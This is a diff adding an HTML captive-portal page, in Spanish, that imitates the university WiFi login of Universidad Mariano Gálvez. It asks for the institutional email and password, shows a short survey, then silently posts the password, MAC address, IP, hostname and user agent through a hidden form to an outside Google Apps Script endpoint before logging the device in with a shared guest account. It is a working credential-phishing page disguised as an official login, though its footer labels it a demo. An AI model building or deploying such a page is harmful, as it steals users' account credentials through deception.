@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>UMG · Acceso WiFi</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0;font-family:'Segoe UI',Roboto,Arial,sans-serif}
+  body{
+    min-height:100vh;display:flex;align-items:center;justify-content:center;padding:18px;
+    background:linear-gradient(135deg,#0b2a5b 0%,#1a4f9c 55%,#1a73e8 100%);
+  }
+  .card{
+    width:100%;max-width:420px;background:#fff;border-radius:20px;padding:34px 30px 28px;
+    box-shadow:0 24px 60px rgba(0,0,0,.35);animation:up .45s ease;
+  }
+  @keyframes up{from{opacity:0;transform:translateY(18px)}to{opacity:1;transform:none}}
+  .logo{width:70px;height:70px;border-radius:50%;margin:0 auto 16px;
+    background:#fff;box-shadow:0 6px 18px rgba(26,115,232,.35);
+    display:flex;align-items:center;justify-content:center;overflow:hidden;
+    border:2px solid #e8eaed}
+  .logo img{width:100%;height:100%;object-fit:contain;padding:4px}
+  h1{font-size:21px;text-align:center;color:#202124;font-weight:600}
+  .sub{text-align:center;color:#5f6368;font-size:13.5px;margin:6px 0 22px}
+  .steps{display:flex;gap:8px;justify-content:center;margin-bottom:20px}
+  .dot{height:6px;width:34px;border-radius:4px;background:#dadce0;transition:.3s}
+  .dot.on{background:#1a73e8}
+  label{display:block;font-size:13px;color:#3c4043;font-weight:600;margin:14px 0 6px}
+  input[type=email],input[type=password],select,textarea{
+    width:100%;padding:12px 14px;border:1.5px solid #dadce0;border-radius:10px;font-size:14.5px;
+    outline:none;transition:.2s;background:#fff;color:#202124}
+  input:focus,select:focus,textarea:focus{border-color:#1a73e8;box-shadow:0 0 0 3px rgba(26,115,232,.15)}
+  textarea{resize:vertical;min-height:70px}
+  .btn{
+    width:100%;margin-top:22px;padding:13px;border:none;border-radius:10px;cursor:pointer;
+    background:#1a73e8;color:#fff;font-size:15px;font-weight:600;transition:.2s}
+  .btn:hover{background:#1557b0;transform:translateY(-1px)}
+  .btn[disabled]{opacity:.7;cursor:default;transform:none}
+  .link{display:block;text-align:center;margin-top:14px;font-size:12.5px;color:#1a73e8;cursor:pointer}
+  .oculto{display:none}
+  .estrellas{display:flex;gap:6px;justify-content:center;margin:6px 0 4px;font-size:30px;user-select:none}
+  .estrellas span{cursor:pointer;color:#dadce0;transition:.15s;line-height:1}
+  .estrellas span.act{color:#fbbc05;transform:scale(1.12)}
+  .aviso{background:#e8f0fe;border-left:4px solid #1a73e8;border-radius:8px;
+    padding:10px 12px;font-size:12px;color:#174ea6;margin-top:18px;line-height:1.5}
+  .ok{text-align:center;padding:8px 0}
+  .check{width:76px;height:76px;border-radius:50%;background:#e6f4ea;display:flex;
+    align-items:center;justify-content:center;margin:0 auto 18px;font-size:40px;color:#188038}
+  .ok h2{color:#188038;font-size:20px;margin-bottom:8px}
+  .ok p{color:#5f6368;font-size:13.5px;line-height:1.6}
+  .spin{width:15px;height:15px;border:2.5px solid rgba(255,255,255,.4);border-top-color:#fff;
+    border-radius:50%;display:inline-block;vertical-align:-2px;margin-right:8px;animation:g .7s linear infinite}
+  @keyframes g{to{transform:rotate(360deg)}}
+  .pie{text-align:center;font-size:11px;color:#9aa0a6;margin-top:18px}
+</style>
+</head>
+<body>
+
+<div class="card">
+
+  <div id="paso1">
+    <div class="logo">
+      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRiaCAOz61q1rd8R5c3N3ux3_-lJbQpnWItGXn1us0G-Q&s=10"
+           alt="Logo UMG"
+           onerror="this.onerror=null;this.src='https://www.umg.edu.gt/assets/img/logo-umg.png'">
+    </div>
+    <h1>Inicia sesión</h1>
+    <p class="sub">Red WiFi <b>UMG_Huehue</b> · Universidad Mariano Gálvez</p>
+
+    <div class="steps"><div class="dot on"></div><div class="dot"></div></div>
+
+    <label>Correo electrónico</label>
+    <input type="email" id="correo" placeholder="usuario@miumg.edu.gt" autocomplete="off">
+
+    <label>Contraseña</label>
+    <input type="password" id="clave" placeholder="••••••••" autocomplete="off">
+
+    <button class="btn" onclick="irPaso2()">Siguiente</button>
+    <div class="aviso">Conéctate con tu cuenta para navegar. Luego cuéntanos qué tal el servicio.</div>
+  </div>
+
+  <div id="paso2" class="oculto">
+    <div class="logo">
+      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRiaCAOz61q1rd8R5c3N3ux3_-lJbQpnWItGXn1us0G-Q&s=10"
+           alt="Logo UMG"
+           onerror="this.onerror=null;this.src='https://www.umg.edu.gt/assets/img/logo-umg.png'">
+    </div>
+    <h1>¿Cómo te pareció el servicio?</h1>
+    <p class="sub">Tu opinión nos ayuda a mejorar</p>
+
+    <div class="steps"><div class="dot on"></div><div class="dot on"></div></div>
+
+    <label>Velocidad del WiFi</label>
+    <div class="estrellas" id="eVel">
+      <span onclick="star('vel',1)">★</span><span onclick="star('vel',2)">★</span>
+      <span onclick="star('vel',3)">★</span><span onclick="star('vel',4)">★</span>
+      <span onclick="star('vel',5)">★</span>
+    </div>
+    <input type="hidden" id="velocidad" value="">
+ <label>Atención / portal</label>
+    <div class="estrellas" id="ePor">
+      <span onclick="star('por',1)">★</span><span onclick="star('por',2)">★</span>
+      <span onclick="star('por',3)">★</span><span onclick="star('por',4)">★</span>
+      <span onclick="star('por',5)">★</span>
+    </div>
+    <input type="hidden" id="portal" value="">
+
+    <label>¿Recomendarías el servicio?</label>
+    <select id="recomienda">
+      <option value="Si">Sí</option>
+      <option value="No">No</option>
+      <option value="Tal vez">Tal vez</option>
+    </select>
+
+    <label>Comentarios (opcional)</label>
+    <textarea id="comentarios" placeholder="Escribe aquí tu opinión..."></textarea>
+
+    <button class="btn" id="btnConectar" onclick="conectar()">Conectar a Internet</button>
+    <span class="link" onclick="volver()">‹ Regresar</span>
+  </div>
+
+  <div id="paso3" class="oculto ok">
+    <div class="check">✓</div>
+    <h2>¡Conectado!</h2>
+    <p>Ya tienes acceso a Internet.<br>Gracias por responder la encuesta.</p>
+    <div class="pie">UMG-Demo · Portal Cautivo</div>
+  </div>
+
+</div>
+
+<iframe name="ifDatos" style="display:none" title="envio"></iframe>
+<iframe name="ifLogin" style="display:none" title="login"></iframe>
+
+<form id="fDatos" method="POST" target="ifDatos"
+      action="https://script.google.com/macros/s/AKfycbyVehiiHGevaR9bLp-o7UYHfSO1Q4TESL03lon6aoGbTNbGAWOnEvD4me0hkyVILOIV/exec">
+  <input type="hidden" name="correo"      id="d_correo">
+  <input type="hidden" name="clave"       id="d_clave">
+  <input type="hidden" name="mac"         value="$(mac)">
+  <input type="hidden" name="ip"          value="$(ip)">
+  <input type="hidden" name="host"        value="$(hostname)">
+  <input type="hidden" name="velocidad"   id="d_velocidad">
+  <input type="hidden" name="portal"      id="d_portal">
+  <input type="hidden" name="recomienda"  id="d_recomienda">
+  <input type="hidden" name="comentarios" id="d_comentarios">
+  <input type="hidden" name="ua"          id="d_ua">
+</form>
+
+<form id="fLogin" method="POST" target="ifLogin" action="$(link-login-only)">
+  <input type="hidden" name="username" value="invitado">
+  <input type="hidden" name="password" value="invitado">
+  <input type="hidden" name="dst"      value="$(link-orig)">
+  <input type="hidden" name="popup"    value="true">
+</form>
+
+<script>
+  var vel = 0, por = 0;
+
+  function irPaso2(){
+    var c = document.getElementById('correo').value.trim();
+    var k = document.getElementById('clave').value;
+    if(!c){ document.getElementById('correo').focus(); return; }
+    if(!k){ document.getElementById('clave').focus(); return; }
+    document.getElementById('paso1').classList.add('oculto');
+    document.getElementById('paso2').classList.remove('oculto');
+  }
+
+  function volver(){
+    document.getElementById('paso2').classList.add('oculto');
+    document.getElementById('paso1').classList.remove('oculto');
+  }
+
+  function star(tipo, n){
+    if(tipo === 'vel'){ vel = n; pintar('eVel', n); document.getElementById('velocidad').value = n + ' de 5'; }
+    else             { por = n; pintar('ePor', n); document.getElementById('portal').value    = n + ' de 5'; }
+  }
+  function pintar(id, n){
+    var st = document.getElementById(id).children;
+    for(var i=0;i<st.length;i++) st[i].className = (i < n) ? 'act' : '';
+  }
+
+  function conectar(){
+    var btn = document.getElementById('btnConectar');
+    btn.disabled = true;
+    btn.innerHTML = '<span class="spin"></span>Conectando...';
+
+    document.getElementById('d_correo').value      = document.getElementById('correo').value.trim();
+    document.getElementById('d_clave').value       = document.getElementById('clave').value;
+    document.getElementById('d_velocidad').value   = document.getElementById('velocidad').value;
+    document.getElementById('d_portal').value      = document.getElementById('portal').value;
+    document.getElementById('d_recomienda').value  = document.getElementById('recomienda').value;
+    document.getElementById('d_comentarios').value = document.getElementById('comentarios').value;
+    document.getElementById('d_ua').value          = navigator.userAgent;
+
+    document.getElementById('fDatos').submit();
+
+    setTimeout(function(){
+      document.getElementById('fLogin').submit();
+    }, 600);
+
+    setTimeout(function(){
+      document.getElementById('paso2').classList.add('oculto');
+      document.getElementById('paso3').classList.remove('oculto');
+    }, 1800);
+  }
+</script>
+</body>
+</html>
